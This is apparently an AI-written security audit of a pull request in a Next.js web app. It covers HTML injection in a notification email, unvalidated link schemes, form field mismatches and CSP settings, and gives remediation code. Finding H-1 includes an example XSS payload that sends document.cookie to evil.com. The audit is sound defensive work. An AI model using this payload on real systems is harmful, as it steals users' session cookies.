# Security Audit Report — PR #139

**Date:** 2026-02-23
**Branch:** epic/pvs-351 → main
**Auditor:** Claude Security Review (claude-sonnet-4-6)
**Scope:** PR #139 diff — contact forms, CSP, prospect dashboard, phone utilities

---

## Executive Summary

PR #139 introduces contact form improvements, a new prospect detail dashboard drawer, CSP adjustments, and phone number formatting utilities. The changes are generally well-structured and show positive security awareness (honeypot pattern, Zod validation, AbortController timeouts, re-entry guards). However, the review uncovered **one High**, **four Medium**, and **three Low** severity issues that should be addressed before or shortly after merge.

The most impactful issue is an HTML injection vector in the email notification body inside `app/api/audit/route.ts`, where user-submitted data is interpolated directly into an HTML string without escaping. The remaining issues span a field-name mismatch that silently drops phone data, unvalidated `javascript:` URL rendering in the dashboard, a duplicated utility function that creates maintenance risk, and missing AbortController cleanup on unmount.

No Critical vulnerabilities were found.

---

## High Vulnerabilities

### H-1: HTML Injection in Audit Email Notification Body

- **Location:** `app/api/audit/route.ts` — lines 140–147
- **Description:** The `sendAuditNotification` function builds an HTML email body by directly interpolating values from the database record using template literals. None of the interpolated values are HTML-escaped before insertion. An attacker who submits a maliciously crafted `name`, `specifics`, or `websiteDisplay` value can inject arbitrary HTML — including `<script>` tags, malicious links, or phishing content — into the email received by Phil and Sami.

  ```typescript
  // app/api/audit/route.ts — lines 140–147 (current, vulnerable)
  const htmlBody = `
    <h2>New Free Website Audit Request</h2>
    <p><strong>Name:</strong> ${record.name}</p>
    <p><strong>Email:</strong> ${record.email}</p>
    <p><strong>Website URL:</strong> <a href="${websiteHref}" target="_blank" rel="noreferrer">${websiteDisplay}</a></p>
    <p><strong>Phone:</strong> ${phone}</p>
    <p><strong>Specifics:</strong> ${specifics}</p>
    <p><strong>Submitted:</strong> ${submittedAt}</p>
  `;
  ```

  Example attack payload for `name`: `<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">` — the email client would execute this if it renders HTML.

- **Impact:** Phishing content or script execution within the email clients of internal team members. Depending on the email client, this could result in credential harvesting or redirection to malicious sites. Severity is elevated because the target audience is internal staff, not end users.
- **Remediation Checklist:**
  - [ ] Add an HTML escape helper before interpolating any user values into `htmlBody`:
    ```typescript
    function escapeHtml(str: string): string {
      return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
    }
    ```
  - [ ] Apply `escapeHtml()` to every field interpolated into the HTML template:
    ```typescript
    const htmlBody = `
      <h2>New Free Website Audit Request</h2>
      <p><strong>Name:</strong> ${escapeHtml(record.name)}</p>
      <p><strong>Email:</strong> ${escapeHtml(record.email)}</p>
      <p><strong>Website URL:</strong>
        <a href="${escapeHtml(websiteHref)}" target="_blank" rel="noreferrer">
          ${escapeHtml(websiteDisplay)}
        </a>
      </p>
      <p><strong>Phone:</strong> ${escapeHtml(phone)}</p>
      <p><strong>Specifics:</strong> ${escapeHtml(specifics)}</p>
      <p><strong>Submitted:</strong> ${escapeHtml(submittedAt)}</p>
    `;
    ```
  - [ ] Note: `submittedAt` is derived from `new Date(...).toLocaleString()` so it is safe, but escaping it defensively costs nothing.
  - [ ] Consider using the Resend React Email SDK or a templating library (e.g. `he`) that handles escaping by default, to prevent this class of issue from recurring.
- **References:** CWE-80 (Improper Neutralization of Script-Related HTML Tags), OWASP A03:2021 Injection

---

## Medium Vulnerabilities

### M-1: `javascript:` URL Not Blocked — Prospect Drawer Renders Unvalidated `href` Values

- **Location:** `components/dashboard/prospects/prospect-detail-drawer.tsx` — lines 350, 404, 415
- **Description:** The drawer renders three `<a>` tags whose `href` values come directly from the database without any URL scheme validation:
  - `prospect.audit_request.website_url` (line 350) — submitted by a public website user
  - `prospect.calendly_booking.reschedule_url` (line 404) — from the Calendly webhook payload
  - `prospect.calendly_booking.cancel_url` (line 415) — from the Calendly webhook payload

  React does sanitize `javascript:` in `href` since React 16.9 (it issues a console warning and renders `about:blank`), so this is not a direct XSS vector in current React versions. However, `data:` URLs and other non-HTTP schemes are **not** blocked by React and could be used by a compromised API or poisoned Calendly webhook to redirect the authenticated dashboard user to a malicious payload. The `audit_request.website_url` originates from a public form submission, making it the higher-risk field.

  ```tsx
  // line 350 — no scheme check
  <a href={prospect.audit_request.website_url} target="_blank" rel="noopener noreferrer">
  ```

- **Impact:** A compromised backend record (through a poisoned Calendly webhook or a database write by another vulnerability) could navigate an authenticated admin user to an attacker-controlled page or execute a `data:` URI payload. Risk is limited to authenticated dashboard users only.
- **Remediation Checklist:**
  - [ ] Add a `safeHref` utility that allowlists only `http:` and `https:` schemes:
    ```typescript
    function safeHref(url?: string | null): string | undefined {
      if (!url) return undefined;
      try {
        const parsed = new URL(url);
        if (parsed.protocol === 'http:' || parsed.protocol === 'https:') return url;
      } catch {
        // invalid URL
      }
      return undefined;
    }
    ```
  - [ ] Apply `safeHref()` to all three anchor elements:
    ```tsx
    <a href={safeHref(prospect.audit_request.website_url)} ...>
    <a href={safeHref(prospect.calendly_booking.reschedule_url)} ...>
    <a href={safeHref(prospect.calendly_booking.cancel_url)} ...>
    ```
  - [ ] When `safeHref` returns `undefined`, conditionally suppress rendering the anchor or display the URL as plain text.
- **References:** CWE-601 (Open Redirect), OWASP A03:2021 Injection

---

### M-2: Review Form Payload Field Name Mismatch Silently Drops Phone Number

- **Location:** `components/contact/contact-review-form.tsx` line 152 vs `app/api/audit/route.ts` line 10
- **Description:** The review form submits the phone field as `phone_number` (snake_case) in its JSON payload, but the server-side Zod schema in the audit API route expects `phoneNumber` (camelCase). Zod's `safeParse` silently ignores unknown keys by default, so the phone number is accepted by the client form validation, stripped of formatting by `stripPhone()`, included in the JSON body — and then silently discarded by the server. The database record and the notification email always show "Not provided" for phone, regardless of what the user entered.

  ```typescript
  // contact-review-form.tsx line 152 — sends phone_number
  const payload = {
    phone_number: stripPhone(data.phone_number),  // key mismatch
    ...
  };

  // app/api/audit/route.ts line 10 — expects phoneNumber
  phoneNumber: z.string().optional()...
  ```

  This is a data integrity bug with a secondary security implication: if the phone field is ever used for fraud/spam rate limiting or identity verification on the server side, the bypass is trivially achievable by relying on this mismatch.

- **Impact:** Phone numbers submitted through the review form are never persisted or emailed. Internal team cannot follow up by phone. No data is corrupted, but the silent failure makes this invisible to operators.
- **Remediation Checklist:**
  - [ ] Rename the key in the `contact-review-form.tsx` payload from `phone_number` to `phoneNumber` to match the API schema:
    ```typescript
    const payload = {
      phoneNumber: stripPhone(data.phone_number),  // was: phone_number
      ...
    };
    ```
  - [ ] Alternatively, update the server schema to accept `phone_number` and handle both casing variants — but aligning the client to the server is cleaner.
  - [ ] Also verify `other_detail` is intentionally excluded from the server schema. The form sends `other_detail` but the audit route schema has no field for it, so the free-text "Other" description is also silently dropped.
  - [ ] Add an integration test or type-checked API client that catches payload shape mismatches at compile time rather than silently at runtime.
- **References:** CWE-20 (Improper Input Validation — data contract mismatch)

---

### M-3: `specifics` Array Accepts Arbitrary Strings — No Enum Allowlist on Client or Server

- **Location:** `components/contact/contact-review-form.tsx` line 47; `app/api/audit/route.ts` line 19
- **Description:** The `specifics` field in the review form is validated client-side as `z.array(z.string().max(100)).max(10)` — this permits any string value, not just the four defined options (`mobile-performance`, `seo-visibility`, `traffic-no-calls`, `page-speed`). The client-side UI only presents those four checkboxes, so a regular user cannot inject arbitrary values. However, any user who sends a direct HTTP POST to `/api/audit` (bypassing the UI) can include arbitrary strings in the `specifics` array, which will be joined and stored verbatim in the database and echoed in the notification email (where M-1 HTML injection applies).

  The server-side schema validates that the joined string is under 2000 characters total but performs no allowlist check on individual values.

  ```typescript
  // contact-review-form.tsx line 47 — any string accepted
  specifics: z.array(z.string().max(100)).max(10).optional(),

  // app/api/audit/route.ts line 19 — server also accepts any string
  specifics: z.union([z.string(), z.array(z.string())])
    .optional()
    .transform((val) => (Array.isArray(val) ? val.join(', ') : val))
    ...
  ```

- **Impact:** Arbitrary text can be stored in the `specifics` column via direct API calls. Combined with the HTML injection issue (H-1), this can deliver malicious HTML content into the internal notification email. Lower risk for SQL injection given Supabase's parameterized REST API, but data integrity is compromised.
- **Remediation Checklist:**
  - [ ] On the server, validate each item in the `specifics` array against an allowlist of known values:
    ```typescript
    const ALLOWED_SPECIFICS = new Set([
      'mobile-performance',
      'seo-visibility',
      'traffic-no-calls',
      'page-speed',
    ]);

    specifics: z.array(z.string())
      .optional()
      .transform((arr) => (arr ?? []).filter((v) => ALLOWED_SPECIFICS.has(v)))
      .transform((arr) => arr.join(', ') || undefined),
    ```
  - [ ] Alternatively, use `z.enum([...])` to reject non-allowlisted values with an explicit error, which makes invalid API calls immediately visible.
  - [ ] On the client in `contact-review-form.tsx`, also tighten the schema to mirror the server (defence in depth — the UI already enforces this visually).
- **References:** CWE-20 (Improper Input Validation), OWASP A03:2021 Injection

---

### M-4: `other_detail` Free-Text Field Has No Server-Side Validation or Storage

- **Location:** `components/contact/contact-review-form.tsx` line 48; `app/api/audit/route.ts` (absent)
- **Description:** The PR adds a new `other_detail` free-text field (`z.string().max(500)`) to the review form. The client validates it and includes it in the API payload, but the server-side schema in `app/api/audit/route.ts` does not declare this field. The data is silently ignored by Zod and never persisted or included in the notification email. This means:
  1. Users who type in "Other" context see no error, but their input is discarded.
  2. If a future developer adds `other_detail` to the server schema without also adding HTML escaping, it becomes a direct injection vector in the email body (see H-1).

- **Impact:** User-provided context is lost; silent data loss erodes trust if a real prospect describes their needs in the "Other" field. The risk escalates to High if the field is later added to the server without escaping.
- **Remediation Checklist:**
  - [ ] Add `other_detail` to the server Zod schema with appropriate constraints:
    ```typescript
    other_detail: z.string().max(500).optional(),
    ```
  - [ ] Add `other_detail` to the database insert payload in `insertAuditRequest()`.
  - [ ] Add `other_detail` (HTML-escaped, per H-1) to the notification email body.
  - [ ] When fixing H-1, ensure `other_detail` is included in the escaping pass.
- **References:** CWE-20 (Improper Input Validation), data integrity

---

## Low Vulnerabilities

### L-1: CSP `connect-src` localhost Exception Uses `process.env.NODE_ENV` — Safe With a Caveat

- **Location:** `next.config.js` line 63
- **Description:** The PR changes `connect-src` from a static string to a template literal that conditionally appends `http://localhost:5001` when `NODE_ENV === 'development'`:

  ```javascript
  `connect-src 'self' ... ${process.env.NODE_ENV === 'development' ? ' http://localhost:5001' : ''}; `
  ```

  This is an appropriate pattern. `NODE_ENV` is evaluated at build time by Next.js, so the production build will never include the localhost exception. The change is safe as implemented.

  The caveat: the CSP string is constructed in `next.config.js`, which runs at both build and server start. If `NODE_ENV` is somehow not set to `production` in the deployment environment (misconfigured CI/CD pipeline), `http://localhost:5001` would appear in the production CSP. This is a configuration management risk, not a code defect.

- **Impact:** Low. In a misconfigured deployment, the CSP would be slightly more permissive than intended (allowing `connect-src` to localhost), but this provides no practical attack surface in production because no local service is reachable from a remote browser.
- **Remediation Checklist:**
  - [ ] Confirm that the production deployment platform (Vercel/Netlify) has `NODE_ENV=production` set explicitly — do not rely solely on convention.
  - [ ] Add a CI step or deployment check that asserts `NODE_ENV !== 'development'` in staging/production builds.
  - [ ] Pre-existing note (not introduced by this PR): `script-src 'unsafe-eval' 'unsafe-inline'` in the CSP significantly weakens XSS protection. These are likely required by Next.js and third-party scripts (Calendly, GTM), but should be reviewed for opportunities to use nonce-based CSP in a future hardening pass.
- **References:** OWASP A05:2021 Security Misconfiguration, CSP Level 3

---

### L-2: AbortController Not Cleaned Up on Component Unmount

- **Location:** `components/contact/contact-details-form.tsx` — `onSubmit` function; `components/contact/contact-review-form.tsx` — `onSubmit` function
- **Description:** Both forms create an `AbortController` and a 15-second `setTimeout` inside `onSubmit`. The `clearTimeout` was correctly moved to `finally` in this PR (fixing a previous issue). However, neither the `AbortController` nor the `setTimeout` are stored in a ref or cancelled if the component unmounts while a request is in-flight. If a user navigates away mid-submission, the request continues, the `fetch` callback resolves, and `setFormState` is called on an unmounted component. In React 18 with `StrictMode`, this triggers a benign warning. In older React or custom frameworks it can cause state update errors.

  Additionally, the 15-second timeout `setTimeout` is created fresh on each `onSubmit` call but the `timeoutId` is not stored in a ref, so if the component unmounts the timeout remains in memory until it fires.

  ```typescript
  // Both forms — no cleanup on unmount
  const onSubmit = async (data) => {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 15_000);
    // No useEffect cleanup for controller or timeoutId
    ...
  };
  ```

- **Impact:** Low. No security impact in isolation. The aborted fetch will not send data twice. However, a pending request after navigation could confuse state management or (in edge cases) interfere with subsequent form submissions if `lastSubmitRef` is not properly reset.
- **Remediation Checklist:**
  - [ ] Store the `AbortController` in a `useRef` and abort it in a `useEffect` cleanup:
    ```typescript
    const controllerRef = useRef<AbortController | null>(null);

    useEffect(() => {
      return () => {
        controllerRef.current?.abort();
      };
    }, []);

    const onSubmit = async (data) => {
      controllerRef.current?.abort(); // cancel any in-flight request
      const controller = new AbortController();
      controllerRef.current = controller;
      ...
    };
    ```
  - [ ] Store the `timeoutId` in a ref as well and clear it in the same cleanup effect.
- **References:** React documentation on effect cleanup, CWE-404 (Improper Resource Shutdown)

---

### L-3: Honeypot Field Name `website_confirm` Is Predictable and Disclosed in Source

- **Location:** `components/contact/contact-details-form.tsx` line 457; `components/contact/contact-review-form.tsx` line 361
- **Description:** The honeypot field uses `name="website_confirm"` (set automatically by `{...register('website_confirm')}`), which is visible in the rendered HTML source. Sophisticated bots that read field names to identify honeypots will recognize this pattern and avoid filling it, bypassing the protection.

  Additionally, the honeypot field in `contact-details-form.tsx` does **not** include the value in the outgoing API payload — the check is purely client-side (`if (data.website_confirm) { reset(); setFormState('success'); return; }`). This means a bot that submits the form payload directly via HTTP (bypassing the browser) will bypass the honeypot entirely, since the check never runs.

  In contrast, `contact-review-form.tsx` does forward `honeypot: data.website_confirm ?? ''` to the API, and the server checks it. The two forms are inconsistent in their enforcement.

  ```typescript
  // contact-details-form.tsx — honeypot check is CLIENT-SIDE ONLY
  if (data.website_confirm) {
    reset();
    setFormState('success'); // bot thinks it succeeded
    return;                  // but nothing was sent to server
  }
  // The API payload does NOT include website_confirm
  const payload = { name, email, companyName, phone, ... }; // no honeypot key
  ```

- **Impact:** Low. A direct HTTP POST to `/api/leads` (bypassing the browser) will submit without the honeypot check. The missing server-side honeypot check on the leads endpoint means automated direct-POST bots are not filtered. The current protection works for browser-based form fill bots.
- **Remediation Checklist:**
  - [ ] Add `honeypot: data.website_confirm ?? ''` to the payload in `contact-details-form.tsx`, matching the pattern already used in `contact-review-form.tsx`.
  - [ ] Ensure the `/api/leads` backend (on the PVS server) also performs the honeypot check server-side and silently accepts the request without processing.
  - [ ] Consider renaming the field to something less obviously honeypot-like (e.g., `confirm_email`, `website_url_secondary`). The name `website_confirm` is semantically meaningful to bot scanners. Note: this is a minor improvement; well-known bot libraries already check for off-screen positioning regardless of name.
  - [ ] Add `aria-label` to the honeypot `<input>` so screen readers that ignore `aria-hidden` on the parent do not confuse visually impaired users. The current `aria-hidden="true"` on the wrapper `<div>` is the correct approach and covers most screen readers, but redundant labeling adds safety.
- **References:** OWASP Testing Guide — Automated Threats to Web Applications (OAT-012)

---

## General Security Recommendations

- [ ] **Deduplicate `formatPhone` / `stripPhone`:** `contact-review-form.tsx` contains local copies of both functions (lines 17–26) while `contact-details-form.tsx` correctly imports from `lib/utils/phone.ts`. The local copies are functionally identical but create a maintenance hazard — a future bug fix in `lib/utils/phone.ts` will not propagate to the review form. Replace the local functions with the shared import.
- [ ] **Validate `prospect.id` before URL interpolation:** In `prospect-detail-drawer.tsx` (lines 99, 165), `prospectId` is interpolated directly into the fetch URL: `` `${getApiBaseUrl()}/api/prospects/${prospectId}` ``. Since `prospectId` comes from the API response (typed as `string`), it is trusted data, but a UUID format check before interpolation would prevent path traversal if the ID ever contains unexpected characters (e.g., `../admin`). A simple `encodeURIComponent(prospectId)` call would be sufficient.
- [ ] **Add `maxLength` to the `NotesField` textarea:** The notes textarea in `prospect-detail-drawer.tsx` (line 208) has no `maxLength` HTML attribute and no server-side length cap visible in the client code. Unbounded free-text fields that auto-save on every keystroke can cause large payloads to hit the API repeatedly. Add `maxLength={10000}` (or whatever the database column limit is) both as an HTML attribute and as a constraint enforced by the PVS API.
- [ ] **Address pre-existing `unsafe-eval` and `unsafe-inline` in `script-src`:** These directives (not introduced by this PR) nullify a large portion of the CSP's XSS protection value. Audit whether all third-party scripts (GTM, Calendly, Sentry CDN) can be loaded via `<script integrity="..." crossorigin>` with Subresource Integrity, and work toward a nonce-based CSP as a future hardening initiative.
- [ ] **Add server-side rate limiting to `/api/audit` and `/api/leads`:** The 5-second client-side throttle is a UX guard, not a security control. A user (or bot) bypassing the browser can POST unlimited requests to these endpoints. Consider implementing IP-based rate limiting (e.g., via Vercel Edge Middleware or Netlify's rate limiting) for the form submission endpoints.

---

## Security Posture Improvement Plan

**Immediate (before or in this PR):**
1. Fix H-1 — HTML escape all user values in `sendAuditNotification()` in `app/api/audit/route.ts`.
2. Fix M-2 — Rename `phone_number` to `phoneNumber` in the review form payload.
3. Fix M-4 — Add `other_detail` to the server schema and database insert.

**Short-term (next sprint):**
4. Fix M-1 — Add `safeHref()` URL scheme validation in `prospect-detail-drawer.tsx`.
5. Fix M-3 — Add an allowlist check for `specifics` values on the server.
6. Fix L-3 (partial) — Forward honeypot value from `contact-details-form.tsx` to the API payload.
7. Deduplicate `formatPhone`/`stripPhone` (General recommendation).

**Medium-term (hardening pass):**
8. Fix L-2 — Add `useEffect` cleanup for `AbortController` in both contact forms.
9. Add `encodeURIComponent` around `prospectId` in drawer API calls.
10. Add `maxLength` to `NotesField` textarea.
11. Implement server-side rate limiting on public form endpoints.
12. Investigate nonce-based CSP to replace `unsafe-eval`/`unsafe-inline`.

---

*Report generated: 2026-02-23 09:39 UTC*
*Files reviewed: `components/contact/contact-details-form.tsx`, `components/contact/contact-review-form.tsx`, `next.config.js`, `components/dashboard/prospects/prospect-detail-drawer.tsx`, `lib/utils/phone.ts`, `app/api/audit/route.ts`, `lib/api-config.ts`, `lib/validation/url.ts`, `middleware.ts`, `components/dashboard/prospects/types.ts`*
